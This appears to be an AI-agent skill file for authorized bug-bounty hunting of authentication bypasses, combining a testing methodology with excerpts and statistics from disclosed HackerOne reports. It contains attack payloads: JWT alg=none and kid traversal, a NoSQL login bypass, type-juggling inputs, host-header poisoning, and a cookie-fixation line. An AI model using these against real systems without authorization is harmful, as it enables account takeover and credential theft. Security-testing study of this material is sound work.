---
name: bbhunt-auth-bypass
description: "Use for login logic flaws, password reset and recovery, session issuance, JWT/session trust, account enumeration, and identity verification failures. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Authentication Bypass — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 989 valid HackerOne reports (197 paid / 20%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| admin / privileged-role context | 162 |
| encoding / double-encode / null byte | 107 |
| Content-Type / body-format switch | 98 |
| header injection (Host / X-Forwarded / etc.) | 86 |
| two-account / cross-account replay | 84 |
| webhook / OAuth / SAML / integration abuse | 78 |
| cache / CDN / unkeyed header | 75 |
| HTTP method / verb tampering | 73 |
| public source-code / repo review | 72 |
|  HosT/absolute-URL reset poisoning | 67 |
| unauthenticated / removed-cookie test | 63 |
| internal service / port / container | 63 |
| file upload / filename / extension | 60 |
| subdomain / DNS / cert-transparency recon | 60 |
| intercept & replay request in Burp | 56 |
| fuzzing / wordlist brute force | 46 |
| XML / SOAP / SAML / XXE | 43 |
| JWT / token / base64 decode | 40 |
| employee / developer public info | 36 |
| race / concurrency / timing | 34 |
| DOM / HTML source inspection | 31 |
| second-order / stored / blind delivery | 30 |
| redirect chain / Location header | 28 |
| cloud metadata / IAM abuse | 28 |
| OAST / DNS / HTTP callback proof | 25 |
| parameter pollution / duplicate keys | 21 |
| third-party data / paste / breach reuse | 21 |
| error message / stack trace probing | 19 |
| WAF / sanitizer / filter bypass | 16 |
| public bucket / storage exposure | 16 |
| swap object ID / parameter value | 15 |
| API docs / Swagger / introspection | 14 |
| JS bundle / source-map inspection | 14 |
| response diff / status / length comparison | 11 |
| replay / modify a captured request | 10 |
| verbose debug / framework fingerprint | 7 |
| parser confusion / normalization | 7 |
| browser DevTools / network tab | 6 |
| git history / exposed .git | 6 |
| deserialization / gadget chain | 4 |
| archive / Wayback endpoint discovery | 4 |
| mass assignment / extra request fields | 2 |
| template injection (SSTI) | 1 |

### Parameters observed in writeups

`name` (28), `charset` (21), `class` (20), `path` (13), `type` (13), `_ga` (13), `max-age` (12), `email` (11), `__utma` (10), `__utmz` (10), `utmcsr` (10), `utmccn` (10), `utmcmd` (10), `href` (9), `__utmb` (9), `__utmc` (9), `action` (8), `utf8` (8), `_secure_admin_session_id` (8), `session` (7), `token` (7), `_gat` (7), `content` (7), `auth` (7), `utmcct` (6), `authenticity_token` (6), `vuid` (6), `_shopify_s` (6), `_shopify_y` (6), `phone` (6)

### Bypass primitives observed

`bypass` (236), `content-type` (195), `bypassed` (34), `bypassing` (33), `whitelist` (19), `race condition` (18), `open redirect` (15), `bypasses` (15), `unicode` (14), `%0d%0a` (13), `trailing dot` (8), `blacklist` (4), `normalization` (4), `blind` (4), `allowlist` (4), `%00` (3), `uppercase` (3), `bypassable` (3), `url encoded` (2), `url encode` (2), `transfer-encoding` (2), `chunked` (2), `out-of-band` (2), `url-encoded` (2), `null byte` (2), `lowercase` (2), `bypasspoc` (2), `case-sensitive` (2)

### Impact language observed

`token` (984), `password` (965), `admin` (505), `credential` (256), `secret` (113), `unauthorized` (103), `localhost` (65), `account takeover` (40), `payment` (36), `sensitive information` (27), `full access` (18), `api key` (13), `pii` (12), `sensitive data` (11), `rce` (11), `financial` (10), `arbitrary file` (7), `privilege escalation` (6), `internal network` (5), `exfiltration` (4)

### Case studies — full excerpts (paid and unpaid)

#### [739737](https://hackerone.com/reports/739737) — Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password

PayPal · $15300 · high

A bug was identified whereby sensitive, unique tokens were being leaked in a JS file used by the recaptcha implementation. In certain cases, a user must solve a CAPTCHA challenge after authenticating. When the security challenge is completed, the authentication request is replayed to log in. The exposed tokens were used in the POST request to solve the CAPTCHA. The researcher identified a method by which a user, starting from a malicious site, could expose the security challenge token to a third party via a cross-site script inclusion (XSSI) attack. If the user then followed a login link from the malicious site and entered their credentials, the malicious third party could complete the security challenge, triggering the authentication request replay and exposing the user's password. This exposure only occurred if a user followed a login link from a malicious site, similar to a phishing page. PayPal implemented additional controls on the security challenge request to prevent token reuse, which resolved the issue, and no evidence of abuse was found. Full write-up available here:

#### [2443228](https://hackerone.com/reports/2443228) — Account Takeover via Authentication Bypass in TikTok Account Recovery

TikTok · $12000 · critical

An improper authentication mechanism in TikTok's account recovery process could have been used for account takeovers on Android devices. There was no evidence of exploitation and this vulnerability has now been completely fixed. We thank @xtt0k for reporting this to our team and confirming its remediation. I identified a critical vulnerability in one of TikTok's endpoints that permitted unauthorized changes to user accounts due to improper parameter handling. This flaw could have allowed a TikTok account to be taken over by knowing the account username. I appreciate TikTok's swift action in resolving this issue and their generous bounty.

#### [976603](https://hackerone.com/reports/976603) — Ability to DOS any organization's SSO and open up the door to account takeovers

Superhuman (formerly Grammarly) · $10500 · high

**Summary:** There's an interesting issue I've spent quite a few days trying to escalate but can't figure out. The impact at this point is that I can DOS any SSO integration making it so nobody in that organization can login. I can also get users to inadvertently SSO into my attacker organization, and then take over their account from there. For existing accounts this would require a victim to click "join", however I think that's likely given the fact that they are SSOing for the first time expecting to join an organization. The strange behavior and why I think it *might* be possible to escalate further, is that I can have you authenticate against one SSO instance, but have you get added to a completely separate one. So that means there is some sketchy logic which can potentially allow an attacker to authenticate against their own SSO instance, and get added to someone else's organization. I'm not sure if it's possible to get this with zero user interaction, but I will keep trying and update the report if I figure out a way. The bug stems from the fact that you can create an `entityId` identical to that of another organization **except** with a space ` ` at the end. The application logic then prioritizes that new entityId to add the user to after authenticating against the correct one. So if you have `myentity` as the legitimate entity, and an attacker sets their entity to `mye

#### [173551](https://hackerone.com/reports/173551) — password reset token leaking allowed for ATO of an Uber account

Uber · $10000 · critical

With an email address for a valid Uber account, it was possible to take over that account because the reset token was exposed in the response of a password reset HTTP request. This meant an attacker could initiate password reset for an account and immediately receive the reset token for that account. We consider the security of our user's data top priority, so we were very interested in this report. Furthermore, @procode701 was a pleasure to work with and we look forward to more reports in the future.

#### [136169](https://hackerone.com/reports/136169) — OneLogin authentication bypass on WordPress sites

Uber · $10000 · severity n/a

First, I'm sorry about reporting another WordPress bug (my intention was just to check if WP-OneLogin stores any sensitive info that could be used to attack OneLogin on your other websites). #Overview# The *.uber.com WordPress sites use OneLogin SAML-SSO instead of the normal WordPress login. The WordPress plugin shipped by OneLogin has a bug which allows anyone to login without a password or other authentication. The attacker can supply a username, email adress, name, and a role. If the username doesn't already exist in the WordPress database, then the plugin will create a new user (if the provisioning setting is on, which it was on the two sites I tested). It looks like in order to gain administrator privileges the attacker has to guess some information - a role name such as "administrator", or the email address or username of an existing administrator. #PoC# I tried this on two sites. On eng.uber.com I couldn't guess a correct role name, user name, or email address to get administrator privileges and therefore was able to create only a "subscriber" level account. On newsroom.uber.com the role name apparently was simply "administrator" so I got that privilege on the system. Some other plugin settings may affect this behavior too. #Reproducing# An example shell script: ~~~~ sh #!/bin/sh xml=`base64 response.xml` curl -v ' \ --data "RelayState=/wp-login.php" --data-urlencode "S

#### [921780](https://hackerone.com/reports/921780) — Improper Authentication - any user can login as other user with otp/logout & otp/login

Snapchat · no bounty — still valid · critical

'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim. I will demonstrate the problem on two accounts. Victim: ███ Attacker: ██████████ - Attacker perform a usuall login to attacker's personal account. - Attacker performs `/scauth/otp/droid/logout` but instead of attacker's user_id, attacker provides victim's user_id request response Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token. - Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step. response An attacker successfully performed login as victim. Victim's user_id can be easily obtained with friends request. I've attached the following: - a screencast to showcase the problem. - burp project ████ - logout+login raw requests exported from burp - a python script to perform the attack I've tested this bug only on my personal accounts. ███████ ███ █████████ ## Impact An attacker is able to login as any user.

#### [129873](https://hackerone.com/reports/129873) — Bypassing Digits origin validation which leads to account takeover

X / xAI · no bounty — still valid · severity n/a

Hi, I would like to report an important issue that affects websites that has integrated "Signin with Digits" , leading to potential account takeover. #Detail In Digits architecture, the data communication channel between Digits and customer's site relies on *postMessage()*. In order to prevent malicious websites prevent themselves to be the legit Digits website and send arbitrary commands to the customer's websites, an origin validation is in place in the SDK. Specifically, the code that's responsible to perform the validation is as follow: **File: In short, the event origin is checked against Digits' origin in this line:`-1 !== this.config.get("sdk_host").search(t.origin)`, which is the same as `-1 !== " In essence, it looks for the occurrence of Digit's origin from sender's origin. The way the validation is done is however flawed. According to the [docs of String.prototype.search()]( the method takes a regular repression object instead of a string. If anything other than regexp is passed, it will get implicitly converted into a regexp. In this case, `t.origin` which is a string is converted into a regexp. In regular expression, a dot (.) is treated as a wildcard. In other words, any character of Digits' origin can be replaced with a dot. An attacker can take advantage of it and use a special domain instead of the official one to bypass the validation, such as `www.d.gits.co` 

### Recurring approach patterns from real reports

- 2× i ve found a authorization issue in coinbase
- 1× however the authenticated session cookie used by a user before logging out is still active
- 1× i took a look at live install of phabricator and noticed that the user gets automatically logged in after clicking the password recovery link this link is sent to the user s mail
- 1× hi i ve found a way to circumvent redirect uri restrictions imposed by the web application using domain suffix subdomain technique
- 1× i created an oauth application under that has oauth redirect uri configured to so technically allowed request shall be denied request shall be surprisingly if i point the redirect uri to see mx suffix the endpoint will be accepted infact endpoint like will be accepted too
- 1× step scrape s3 i wrote a rough poc that scrapes s3 and shows the found exports not something i d use just something i wrote for demonstration purposes feel free to use the team id and name i mentioned before to check it out
- 1× i should also mention that i haven t looked through all the files but any sensitive file with the protection class set to anything other than nsfileprotectioncomplete would be extractable from the iphone without requiring the passcode
- 1× hi i found a brute forcing attacking on your website
- 1× i am tested invalid credentials and no account lockout was detected this means it s vuln to brute forcing attack
- 1× you should able to see previous page and not only previous page but also viewed pages in the portal by clicking back back button thanks hari
- 1× i read the bug of melvin and i also try to bypass this so i made a bypassing tehcnique but didnt work but i think i found a bug this is the screen shot when a user authorizes their twitter to connect with the url above they will encounter that error
- 1× under advanced settings users have the ability to protect their wallet by requiring two factor confirmation when sending bitcoins
- 1× personally i have configured my account with the most secure option which requires two factor confirmation when sending any amount of bitcoins
- 1× i have tried showing all the three issues in the poc please let me know if you need the poc video as i can t upload it here because of some issues
- 1× because i was able to set my password which is really common and anyone can hack it
- 1× i found that you are using x csrf token as a protection against csrf attacks
- 1× explaination suppose at hrs i used password reset options of mavenlink and got a token on my email lets call it token01 but i didnot use it
- 1× and at hrs i used again the password reset option and got a new token which is token02
- 1× attack scenario suppose i am an attacker and i got access to the recovery email option of your mavenlink account i logged in to ur recovery email suppose that is user gmail com then i used the forget password option of your mavenlink email i will get one password reset token
- 1× hello i found another bug on hackerone
- 1× i tried this one on my account only
- 1× hey i was able to replay a cookie of a current active session and hijack that by replaying the cookie
- 1× although i have managed to do with the other ones waiting for your reply
- 1× i have found content spoofing vulnerable in slack at stripe integrations vulnerability is exploitable to all users proof of concept regards jayson zabate

## Corpus-backed method (this class)

1. Trace the whole authentication lifecycle: login, token issuance, refresh, reset, email change, logout, and session invalidation.
2. Test identity verification at each step: can a second email, array, or alternate parameter change who the token is issued for?
3. Probe type confusion: JSON arrays for email/user, `null`, numeric coercion, duplicate parameters, and content-type switches.
4. Examine reset tokens for exposure in response bodies, referers, logs, predictable generation, and non-invalidation after use.
5. Check session fixation, missing regeneration on login, and continued validity after logout/password change.
6. For JWT/session tokens, decode without trusting: algorithm, claims, expiry, audience, and signature verification path.
7. Prove a real authentication state change for an identity you should not control.

### Signals

- Login, reset, change-email or account-linking flows
- Type juggling or array inputs accepted where a scalar is expected
- Tokens returned in responses, emails, logs or URLs
- Different responses/timings for valid vs invalid identities

### Kill criteria

- Requires the victim's password or an already valid session.
- Enumeration only, with no downstream attack path in scope.
- Token exposed but unusable (wrong audience/expiry) and no way to redeem it.

### Escalation chains

- Reset flow poisoning -> ATO.
- Auth bypass -> admin function -> data or RCE.
- Account linking flaw -> takeover via third-party identity.

### Probes

- Replace `"user[email]":"victim@x"` with an array containing victim+attacker emails
- Duplicate `email=` parameters; switch form to JSON; try `email=null`
- Reuse a reset token after password change; check Referer leakage

### Veteran tip

A real corpus case turned a Content-Type conversion into a dual-recipient reset email — parameter shape is a first-class auth test.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Test password reset: token entropy, reuse, expiry, host-header poisoning, email enumeration.
- Attack JWT: alg=none, key confusion, weak secret, kid/jku injection, missing signature.
- Probe OAuth/SSO redirect_uri, state, nonce, and account-linking flows.
- Try type juggling and NoSQL/SQLi in login and OTP endpoints.
- Check registration verification: email/phone reuse, unicode normalization, duplicate identities.

### Deeper checklist

- Test password reset: token entropy, reuse, expiry, host-header poisoning, email enumeration, response leakage.
- Attack JWT: alg=none, key confusion, weak HMAC secret, kid/jku injection, missing signature checks.
- Probe OAuth/SSO flows for redirect_uri bypass, state CSRF, code reuse, and account linking flaws.
- Try SQLi/NoSQLi and type juggling in login and OTP endpoints.
- Test OTP: brute force limits, reuse, response leakage, race conditions, backup codes.
- Check registration for email/phone verification bypass and duplicate-identity handling.
- Test remember-me and session tokens for predictability, fixation, and missing revocation.
- Confirm you can access another account or a privileged area end-to-end.

### Step-by-Step Hunting Methodology

1. **Map all authentication entry points**
   - spider the target for every login surface: main login, admin login, API login, partner portal, mobile API endpoints
   - check `robots.txt`, JS files, and the wayback machine for forgotten endpoints like `/xmlrpc.php`

2. **Identify the auth mechanism per entry point**
   - Is it forms-based, SAML, OAuth, API key, session token?
   - For WordPress: always probe `/xmlrpc.php` even if the main login is SSO-protected

3. **Test XMLRPC independently of SSO**
   - If site uses SSO (e.g., OneLogin), manually POST to `/xmlrpc.php`
   - XMLRPC uses WordPress-native credentials, not SSO — test with `system.listMethods` first, then `wp.getUsersBlogs`

4. **Enumerate SAML implementation**
   - Capture a valid SAMLResponse via Burp
   - Decode the Base64 payload, inspect the XML
   - Test signature stripping, comment injection, and XML wrapping attacks
   - Test if SP validates the signature at all (send unsigned assertion)

5. **Test cross-portal session/token reuse**
   - Log into `partners.shopify.com` type portals
   - Attempt to use the issued token/cookie against the main admin portal
   - Look for shared cookie domains, shared JWT secrets, or API tokens that work across contexts

6. **Fuzz auth parameters**
   - Null/empty passwords, `password[]=array`, SQL in username field
   - Try `admin`/`admin`, `test`/`test` on staging subdomains
   - Modify `role`, `is_admin`, `user_type` in JWTs (none algorithm, weak secret)

7. **Check redirect and state parameters**
   - Does removing `state` from OAuth break anything?
   - Can you change `redirect_uri` to an open redirect target?
   - Does the `RelayState` in SAML get validated?

8. **Verify impact by escalating privileges**
   - Don't stop at login — prove you can access admin functions, other users' data, or sensitive configuration
   - Screenshot the highest-privilege action you can perform

---

### A. Discovery checklist — concrete places, params, headers, flows to look

- Inventory every auth endpoint beyond `/login`: `/login2`, `/login-steps/first` and `/second`, `/otp-verify`, `/api/*/login`, `/sso`, `/api/home/ssoAuthentication`, legacy `/v1/*`, XMLRPC `/xmlrpc.php`, SharePoint `/_vti_bin/Authentication.asmx`. Top HackerOne auth-bypass patterns repeatedly hit legacy endpoints that skip the branded UI's controls.
- Trace the multi-step login in Burp and note any identity-bearing cookie set at step 1 (`verify=`, `account=`, `Set-Cookie: ...=<username>`) and every parameter that selects the identity (`username`, `user_id`, `userId`, `email`, hidden fields).
- Test whether the second factor actually gates a session: after password-only login, manually browse to `/my-account`, `/profile`, `/dashboard`, `/admin` before submitting any code.
- Probe parameter pollution (duplicate `username`/`password`), HTTP verb tampering (GET on a POST-only login), `X-HTTP-Method-Override`, and path-override headers (`X-Original-URL`, `X-Rewrite-URL`).
- Username-enumeration channels: distinct messages ("Invalid username" vs "Incorrect password"), a missing full stop, status-code differences, response timing that grows with password length, account-lockout differences, and `/.well-known/webfinger` (200 vs 404; also LDAP injection there — PortSwigger "Hidden OAuth attack vectors").
- Check whether IP-based brute-force protection trusts `X-Forwarded-For` (PortSwigger timing lab), and whether "remember me" tokens are predictable concatenations of username + timestamp.
- Look for token-issuance endpoints that accept arbitrary identity inputs (Synack's refresh endpoint issuing tokens for any username; HackTricks' `ssoAuthentication` taking a bare `username`) — the app itself signs the attacker-chosen identity, so no JWT forgery is needed.
- Client-side gates: response flags `success`, `requires_2fa`, `valid`, `actionResult`, status codes, and identity values in `localStorage`/`sessionStorage`.

- Check the login response for a "success" flag that the client uses to decide navigation (Twitter re-confirmation pattern); changing the server-side flag or the client-side check can bypass the re-auth step.
- Note default/unchanged credentials on admin and appliance surfaces — a 2025 Synack roundup and the 2025 "Fragile Lock" SAML writeups both show that SSO configured over a forgotten default password is still an auth bypass.
- Look for unauthenticated configuration endpoints that return admin data or create sessions (CWE-306): directory enumeration of `/admin`, `/api/admin`, `/console`, and `.actuator` paths is part of the auth-bypass surface, not just recon.
- When testing `X-Forwarded-For` bypass of IP throttling, verify which hop actually trusts the header — PortSwigger's timing lab confirms support, but real CDNs may strip it; correlate with the source IP seen by a Collaborator.
- Enumerate OAuth/OIDC endpoints even when the UI only shows password login — many apps accept an `id_token`, `access_token`, or a bare `username` at a hidden SSO bootstrap route (HackTricks "username-only SSO bridge").
- Check whether the app accepts an authorization code or token granted to a *different* client — "abusing other apps' tokens" is a known ATO path when the token's audience is never checked.
- Record how the app handles `prompt=none`: silent approval can make login-CSF and session-poisoning chains one-click instead of two.
- Look for legacy protocol endpoints (XMLRPC `system.multicall`, WordPress `/xmlrpc.php`, SharePoint `Authentication.asmx`) that accept native credentials and bypass SSO/MFA entirely — these are among the highest-value disclosed HackerOne auth-bypass patterns.
- Test path- and parameter-based access controls with case variation and URL encoding (`/ADMIN`, `/%61dmin`, `/admin;`), plus `X-Original-URL` / `X-Rewrite-URL` overrides that can bypass platform URL-matching rules.

### Signals and surfaces

### Signal

- Reports: **989** · paid: **197**
- Median bounty **$500** · p90 **$3,000** · max **$15,300** · total **$289,790**
- Median upvotes **10**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Uber | 36 | $43,100 | 1762 |
| Shopify | 54 | $29,700 | 1213 |
| TikTok | 3 | $27,000 | 446 |
| GitLab | 8 | $18,580 | 568 |
| Pornhub | 16 | $18,250 | 462 |
| PayPal | 1 | $15,300 | 1409 |
| Superhuman (formerly Grammarly) | 2 | $13,000 | 342 |
| Slack | 19 | $12,650 | 934 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`email` `username` `password` `otp` `code` `token` `reset` `next` `redirect_uri` `state` `saml` `jwt`

### Crown Jewel Targets

Auth bypass is consistently one of the highest-paying vulnerability classes in bug bounty because it directly violates the most fundamental security control. High-value targets include:

- **SSO/SAML implementations** at enterprise SaaS companies (Slack, Okta, OneLogin integrations) — payouts regularly in the $5K–$25K+ range
- **Admin panels and partner/internal portals** — subdomain-separated admin surfaces like `partners.shopify.com`, `admin.company.com`
- **Third-party auth plugin integrations** — WordPress plugins (OneLogin, WP-SAML-Auth), Drupal SSO modules, any CMS with pluggable auth
- **XMLRPC endpoints** on WordPress — often forgotten, bypasses standard WP auth flows entirely
- **OAuth callback flows** — state parameter mishandling, redirect_uri mismatches
- **API authentication layers** — especially where auth was bolted on after the fact

**Asset priority:** Targets with federated identity (SAML, OAuth, OIDC) connected to large user populations. Partner/reseller portals are particularly juicy because they often have elevated permissions and less security scrutiny than the main product.

---

### Attack Surface Signals

**URL patterns to hunt:**
```
/xmlrpc.php
/wp-login.php
/saml/
/sso/
/auth/saml/callback
/oauth/callback
/partners.*
/admin.*
/?wc-api=
/api/v*/auth
/login?redirect=
/accounts/login
```

**Response headers signaling SSO:**
```
X-Frame-Options: SAMEORIGIN (common on SSO portals)
Set-Cookie: SAMLResponse=
Location: https://idp.company.com/saml
WWW-Authenticate: Bearer realm="partners"
```

**JS patterns indicating federated auth:**
```javascript
// Look for in page source
samlRequest
RelayState
SAMLResponse
onelogin
shibboleth
okta
passport.js authenticate
```

**Tech stack signals:**
- WordPress + any SSO plugin → check XMLRPC separately
- Shopify Partner API exposure → cross-tenant privilege escalation risk
- Any app advertising "SSO enabled" or "Login with [Enterprise IdP]"
- Separate subdomains for admin/partner that share session cookies with main domain
- Applications using `SimpleSAMLphp`, `ruby-saml`, `python-saml`

**Burp passive scan triggers:**
- `SAMLResponse` in any POST body
- `openid_connect` or `id_token` in responses
- Cookie domains set to `.company.com` (wildcard)

---

### Techniques, payloads and bypasses

### Payloads & probes

- JWT -> `{"alg":"none"}`, HS256 with public key as secret, `kid=../../dev/null`
- NoSQL -> `{"user":"admin","pass":{"$ne":null}}`
- Type juggling -> `password[]=x`, `otp=0e12345`, `true` vs `"true"`
- Header tricks -> `X-Forwarded-Host: evil`, `Host: evil`, `X-Original-URL: /admin`

### Bypass tricks

- Reset token leaked via Referer, shared cache, logs, or email link scanner.
- Response manipulation: change `success:false` to true, remove error checks.
- Case/unicode normalization of emails and usernames.
- Session fixation and missing token rotation after login.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password** — `#739737` · PayPal · $15,300 · ▲1409
  > https://medium.com/@alex.birsan/the-bug-that-exposed-your-paypal-password-539fc2896da9?sk=aeba33c3c331c3f06d230296a21a41e7
- **Improper Authentication - any user can login as other user with otp/logout & otp/login** — `#921780` · Snapchat · $0 · ▲972
  > - Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step.
- **Bypassing Digits origin validation which leads to account takeover** — `#129873` · X / xAI · $0 · ▲619
  > In short, the event origin is checked against Digits' origin in this line:`-1 !== this.config.get("sdk host").search(t.origin)`, which is the same as `-1 !== "https://www.digits.com".search(t.origin)`.
- **Flickr Account Takeover using AWS Cognito API** — `#1342088` · Flickr · $0 · ▲440
  > The `access token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:
- **Chained Bugs to Leak Victim's Uber's FB Oauth Token** — `#202781` · Uber · $0 · ▲427
  > Next, @ngalog found that the `https://login.uber.com/logout` endpoint would redirect based on the Referer header, making it possible to chain together another redirect.
- **URL link spoofing** — `#481472` · Slack · $250 · ▲362
  > Words such as `http://example.com` and `example.com` included in the message are displayed by URL link.
- **[cs.money] Open Redirect Leads to Account Takeover** — `#905607` · CS Money · $0 · ▲357
  > Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in…
- **Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)** — `#143717` · Uber · $0 · ▲312
  > Through the endpoint at /rt/users/passwordless-signup it is possible to change the password of any Uber user, given knowledge of their phone number (or by just enumerating phone numbers until one is found that is registered with Uber - not too hard given the…
- **Bypass Password Authentication for updating email and phone number - Security Vulnerability** — `#770504` · X / xAI · $0 · ▲288
  > {"flow token":"[PASTE FLOW TOKEN HERE]:1","status":"success","subtasks":[{"subtask id":"EnterPhoneForAssociation","enter phone":{"primary text":{"text":"Add a phone number","entities":[]},"secondary text":{"text":"Enter the phone number youâd like to…
- **Insufficient OAuth callback validation which leads to Periscope account takeover** — `#110293` · X / xAI · $0 · ▲277
  > callback url = a/../../login?redirect after login=https://cards.twitter.com/card id
- **Insufficient validation on Digits bridge** — `#168116` · X / xAI · $0 · ▲263
  > The problem is that there is a way for a website to disable sending Referer for out bound requests by using the tag `<meta name="referrer" content="never" `.
- **Ability to DOS any organization's SSO and open up the door to account takeovers** — `#976603` · Superhuman (formerly Grammarly) · $10,500 · ▲260
  > So if you have `myentity` as the legitimate entity, and an attacker sets their entity to `myentity[SPACE]` (with a space at the end); users attempting to authenticate into the legitimate `myentity` will technically authenticate against it, but then the…
- **Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties** — `#922456` · GitLab · $3,000 · ▲257
  > It's possible to play the `/oauth/authorize` request directly to bypass the `Verify the email address in your account profile before you sign in.` prompt.
- **Mass Account Takeover at https://app.taxjar.com/ - No user Interaction** — `#1581240` · Stripe · $0 · ▲253
  > The vulnerability was caused by a leaked token in the delete invitation request feature and resolved by using the invitation ID instead of the token to look up the user’s invite when deleting an invitation.
- **Improper Validation at Partners Login** — `#990048` · Eternal · $2,000 · ▲251
  > Our backend generated the OTP for `phone number` param but appended the `country isd` parameter to the `phone number` param before sending the SMS without any major checks.
- **Stealing SSO Login Tokens (snappublisher.snapchat.com)** — `#265943` · Snapchat · $7,500 · ▲244
  > `https://snappublisher.snapchat.com/api/v1/media/████/file/somthine.svg?%23pranav` this redirects with `307` status code to `storage.googleapis.com/creativesuite-prod-media/ ` with `SSO login token ticket` in ` hashfragment` carried forward by browser.
- **Incorrect authorization to the intelbot service leading to ticket information** — `#1328546` · TikTok · $15,000 · ▲219
  > An authentication bypass and site wide stored XSS (cross-site scripting) vulnerability was found on TikTok Ads as JWT (JSON Web Token) was not verified properly.
- **HackerOne Jira integration plugin Leaked JWT to unauthorized jira users** — `#1103582` · HackerOne · $3,000 · ▲213
  > When you click on "click here", you will be directed to a link this "`https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN `" containing JWT parameter to complete the integration process.
- **Mass Accounts Takeover Without any user Interaction  at https://app.taxjar.com/** — `#1685970` · Stripe · $0 · ▲212
  > The vulnerability was caused by manipulating the user's number in the POST request to `/accounts/<ACCOUNT NUMBER ` with adding the user's email parameter carrying the attacker's email in the payload data in the request, which causing changing the email in the…
- **2FA Bypass leads to  impersonation of legimate users** — `#2885636` · Drugs.com · $0 · ▲207
  > Go to https://www.drugs.com/account/register/ and create an account using an email you own.
- **H1514 [*.(my)shopify.com] - Viewing Password Protected Content** — `#421859` · Shopify · $3,000 · ▲192
  > Because of the `/preview bar`, the password protection is rendered useless.
- **Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com** — `#219205` · Uber · $0 · ▲183
  > Although there were some countermeasures to prevent theft, the current setup still allows leakage of these high-value session cookies to the overtaken subdomain https://saostatic.uber.com in all modern browsers, leading to a full Authentication Bypass (highly…
- **Account Takeover via Authentication Bypass in TikTok Account Recovery** — `#2443228` · TikTok · $12,000 · ▲172
  > I identified a critical vulnerability in one of TikTok's endpoints that permitted unauthorized changes to user accounts due to improper parameter handling.
- **Web Authentication Endpoint Credentials Brute-Force Vulnerability** — `#127844` · HackerOne · $0 · ▲161
  > The following successful brute-force attack of 10.001 passwords (https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k most common.txt appended with the real password) against test account ██████:Geniaal2!!
- **Absence of Token expiry leads to Unauthorized login Access** — `#766578` · Affirm · $0 · ▲155
  > When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.
- **H1514 Session Fixation on multiple shopify-built apps on *.shopifycloud.com and *.shopifyapps.com** — `#423136` · Shopify · $0 · ▲144
  > Attacker uses XSS on .shopifycloud.com and writes the cookie scoped to all subdomain to victim `document.cookie=' flow session=EVIL;domain=.shopifycloud.com;path=/';`
- **Open Redirect on central.uber.com allows for account takeover** — `#206591` · Uber · $0 · ▲144
  > When logging into `central.uber.com`, the `state` parameter for login.uber.com contained a redirect location instead of a CSRF token.
- **Attacker can obtain write access to any federated share/public link** — `#1170024` · Nextcloud · $4,000 · ▲142
  > For the sake of this example the `remote id = 2` and the `token = nOxdNJkb1xbI1VX`
- **Reading Emails in Uber Subdomains** — `#156536` · Uber · $0 · ▲141
  > Link to blog: http://blog.pentestnepal.tech/post/149985438982/reading-ubers-internal-emails-uber-bug-bounty
- **Mint Oauth2 access token for targeted user** — `#1148364` · GitLab · $5,580 · ▲140
  > `doorkeeper application%5Btrusted%5D=0&doorkeeper application%5Btrusted%5D=1& ` This will allow us to create an application that is trusted by default.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 5× | `artifactory@r3.com` |
| 5× | `<userId>` |
| 4× | `url_match_auth_nego()` |
| 4× | `url_match_result()` |
| 4× | `ssh_config_matches()` |
| 3× | `abc@xyz.com` |
| 3× | `url_match_auth_ntlm()` |
| 3× | `support+1@trint.com` |
| 3× | `k->headerline` |
| 3× | `on_resp_header()` |
| 3× | `namevalue()` |
| 2× | `https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>` |
| 2× | `https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>` |
| 2× | `{"error": true, "errorMessage": "Invalid request"}` |
| 2× | `postPrivate()` |
| 2× | `badca7@wearehackerone.com` |
| 2× | `https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat` |
| 2× | `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register` |
| 2× | `GET → 404 {"status":404,"error":"Not Found"}` |
| 2× | `https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect` |

### Bypassing Digits origin validation which leads to account takeover

`#129873` · X / xAI · $0 · n/a · 2020-06-24 · ▲619
> Hi, I would like to report an important issue that affects websites that has integrated "Signin with Digits" , leading to potential account takeover. Detail In Digits architecture, the data communication channel between Digits and customer's site relies on postMessage() .

### Common Root Causes

1. **SSO bypasses local auth entirely at the UI layer, but not at the API layer** — developers disable the login form but forget that API endpoints (`/xmlrpc.php`, REST API, mobile API) have their own auth handlers that still accept native credentials.

